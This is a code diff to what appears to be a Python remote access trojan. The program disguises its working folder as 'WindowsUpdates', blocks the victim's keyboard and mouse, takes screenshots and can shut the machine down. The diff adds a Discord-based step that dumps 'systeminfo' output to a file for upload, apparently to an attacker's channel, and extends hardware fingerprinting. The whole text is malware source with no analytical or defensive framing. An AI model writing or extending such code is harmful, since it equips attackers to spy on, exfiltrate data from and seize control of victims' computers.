@@ -16,19 +16,18 @@ import pyautogui
 import numpy as np
 import imageio
 import pynput
+import discord
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
 kb_listener = pynput.keyboard.Listener(suppress=True)
 m_listener = pynput.mouse.Listener(suppress=True)
 
-def pc_info():
-  ip = os.popen("ipconfig | findstr IPv4").read()
-  hostname = os.popen("hostname").read()
-  username = os.popen("whoami").read()
-  os_version = os.popen("ver").read()
-  mac = os.popen("getmac").read()
-  return f"IP: {ip}\nMAC: {mac}\nHostname: {hostname}\nUsername: {username}\nOS Version: {os_version}"
+def comp_info():
+  os.system("systeminfo > pc_info.txt")
+  embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
+  file_out = discord.File("pc_info.txt", filename="pc_info.txt")
+  return embed, file_out
 
 def pc_shutdown():
   os.popen("shutdown /s /t 0")
@@ -38,7 +37,8 @@ def hardware_info():
   cpu = os.popen("wmic cpu get name").read()
   gpu = os.popen("wmic path win32_VideoController get name").read()
   ram = os.popen("wmic MemoryChip get Capacity").read()
-  return f"HWID: {hwid}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}"
+  disk_size = os.popen("wmic diskdrive get size").read()
+  return f"HWID: {hwid}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nDisk Size: {disk_size}"
 
 def screenshot():
   ImageGrab.grab().save(f"{operation_dir}\\screenshot.png")
